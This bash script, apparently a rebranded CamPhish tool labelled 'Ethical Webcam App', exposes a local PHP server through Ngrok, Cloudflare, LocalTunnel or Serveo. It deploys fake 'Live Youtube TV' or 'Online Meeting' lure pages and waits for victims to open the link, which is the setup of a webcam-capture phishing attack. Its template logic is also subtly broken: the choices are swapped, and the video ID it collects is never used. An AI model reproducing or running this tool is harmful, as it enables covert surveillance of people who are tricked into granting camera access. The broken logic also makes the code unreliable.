#!/bin/bash
# Ethical Webcam App Tunneling Script
# Supports Ngrok, Cloudflare, LocalTunnel, and Serveo

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m Ethical Webcam App \e[0m \n"
printf " \e[1;77m Customized for Testing \e[0m \n\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
}

stop() {
if [[ "$windows_mode" == true ]]; then
  taskkill /F /IM "ngrok.exe" 2>/dev/null
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
  taskkill /F /IM "npx" 2>/dev/null
else
  killall -2 ngrok > /dev/null 2>&1
  killall -2 php > /dev/null 2>&1
  killall -2 cloudflared > /dev/null 2>&1
  killall -2 lt > /dev/null 2>&1
  killall -2 ssh > /dev/null 2>&1
fi
exit 1
}

localtunnel_server() {
if [[ -e lt ]] || [[ -e lt.exe ]]; then
  echo ""
else
  command -v npm > /dev/null 2>&1 || { echo >&2 "I require npm but it's not installed. Install it. Aborting."; exit 1; }
  printf "\e[1;92m[\e[0m+\e[1;92m] Installing LocalTunnel...\n"
  npm install -g localtunnel > /dev/null 2>&1
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting LocalTunnel...\n"
if [[ "$windows_mode" == true ]]; then
  npx localtunnel --port 3333 > .localtunnel.log 2>&1 &
else
  lt --port 3333 > .localtunnel.log 2>&1 &
fi
sleep 10
link=$(grep -o 'https://[a-z0-9]*\.loca\.lt' .localtunnel.log)
if [[ -z "$link" ]]; then
  printf "\e[1;31m[!] LocalTunnel link not generated. Possible reasons:\e[0m\n"
  printf "\e[1;92m[\e[0m*\e[1;92m] Check your internet connection\n"
  printf "\e[1;92m[\e[0m*\e[1;92m] LocalTunnel may be down\n"
  printf "\e[1;92m[\e[0m*\e[1;92m] Try running: lt --port 3333\n"
  exit 1
else
  printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_localtunnel
checkfound
}

serveo_server() {
if ! command -v ssh > /dev/null 2>&1; then
  echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1;
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting Serveo tunnel...\n"
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > .serveo.log 2>&1 &
sleep 10
link=$(grep -o 'https://[a-z0-9]*\.serveo.net' .serveo.log)
if [[ -z "$link" ]]; then
  printf "\e[1;31m[!] Serveo link not generated. Possible reasons:\e[0m\n"
  printf "\e[1;92m[\e[0m*\e[1;92m] Check your internet connection\n"
  printf "\e[1;92m[\e[0m*\e[1;92m] Serveo may be down\n"
  printf "\e[1;92m[\e[0m*\e[1;92m] Try running: ssh -R 80:localhost:3333 serveo.net\n"
  exit 1
else
  printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_serveo
checkfound
}

cloudflare_tunnel() {
if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
  echo ""
else
  command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
  printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
  arch=$(uname -m)
  os=$(uname -s)
  if [[ "$windows_mode" == true ]]; then
    wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
    chmod +x cloudflared.exe
    echo '#!/bin/bash' > cloudflared
    echo './cloudflared.exe "$@"' >> cloudflared
    chmod +x cloudflared
  else
    case "$arch" in
      "x86_64") wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1 ;;
      "aarch64"|"arm64") wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1 ;;
      *) wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1 ;;
    esac
    chmod +x cloudflared
  fi
fi
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflared tunnel...\n"
if [[ "$windows_mode" == true ]]; then
  ./cloudflared.exe tunnel --url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
else
  ./cloudflared tunnel --url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
fi
sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
if [[ -z "$link" ]]; then
  printf "\e[1;31m[!] Cloudflared link not generated. Possible reasons:\e[0m\n"
  printf "\e[1;92m[\e[0m*\e[1;92m] Check your internet connection\n"
  printf "\e[1;92m[\e[0m*\e[1;92m] Cloudflared may be down\n"
  exit 1
else
  printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_cloudflare
checkfound
}

ngrok_server() {
if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
  echo ""
else
  command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
  command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
  printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
  arch=$(uname -m)
  os=$(uname -s)
  if [[ "$windows_mode" == true ]]; then
    wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
    unzip ngrok.zip > /dev/null 2>&1
    chmod +x ngrok.exe
    rm -rf ngrok.zip
  else
    case "$arch" in
      "x86_64") wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1 ;;
      "aarch64"|"arm64") wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1 ;;
      *) wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1 ;;
    esac
    unzip ngrok.zip > /dev/null 2>&1
    chmod +x ngrok
    rm -rf ngrok.zip
  fi
fi
if [[ "$windows_mode" == true ]]; then
  if [[ -e "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
    read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
    if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
      read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
      ./ngrok.exe authtoken $ngrok_auth > /dev/null 2>&1
    fi
  else
    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
    ./ngrok.exe authtoken $ngrok_auth > /dev/null 2>&1
  fi
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  sleep 2
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
  ./ngrok.exe http 3333 > /dev/null 2>&1 &
else
  if [[ -e ~/.ngrok2/ngrok.yml ]]; then
    read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
    if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
      read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
      ./ngrok authtoken $ngrok_auth > /dev/null 2>&1
    fi
  else
    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
    ./ngrok authtoken $ngrok_auth > /dev/null 2>&1
  fi
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  sleep 2
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
  ./ngrok http 3333 > /dev/null 2>&1 &
fi
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
  printf "\e[1;31m[!] Ngrok link not generated. Possible reasons:\e[0m\n"
  printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok authtoken is not valid\n"
  printf "\e[1;92m[\e[0m*\e[1;92m] Check your internet connection\n"
  exit 1
else
  printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_ngrok
checkfound
}

payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 2 ]]; then
  cp liveyttv.html index2.html
else
  cp onlinemeeting.html index2.html
fi
}

payload_cloudflare() {
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 2 ]]; then
  cp liveyttv.html index2.html
else
  cp onlinemeeting.html index2.html
fi
}

payload_localtunnel() {
link=$(grep -o 'https://[a-z0-9]*\.loca\.lt' .localtunnel.log)
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 2 ]]; then
  cp liveyttv.html index2.html
else
  cp onlinemeeting.html index2.html
fi
}

payload_serveo() {
link=$(grep -o 'https://[a-z0-9]*\.serveo.net' .serveo.log)
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 2 ]]; then
  cp liveyttv.html index2.html
else
  cp onlinemeeting.html index2.html
fi
}

checkfound() {
printf "\n\e[1;92m[\e[0m*\e[1;92m] Waiting for users to access the link...\e[0m\n"
while [ true ]; do
  sleep 1
done
}

camphish() {
printf "\n-----Choose tunnel server----\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare Tunnel\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m LocalTunnel\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Serveo\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template

if [[ $option_server -eq 1 ]]; then
  ngrok_server
elif [[ $option_server -eq 2 ]]; then
  cloudflare_tunnel
elif [[ $option_server -eq 3 ]]; then
  localtunnel_server
elif [[ $option_server -eq 4 ]]; then
  serveo_server
else
  printf "\e[1;93m [!] Invalid option!\e[0m\n"
  sleep 1
  clear
  camphish
fi
}

select_template() {
printf "\n-----Choose a template----\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
elif [[ $option_tem -eq 2 ]]; then
  printf ""
else
  printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
  sleep 1
  select_template
fi
}

banner
dependencies
camphish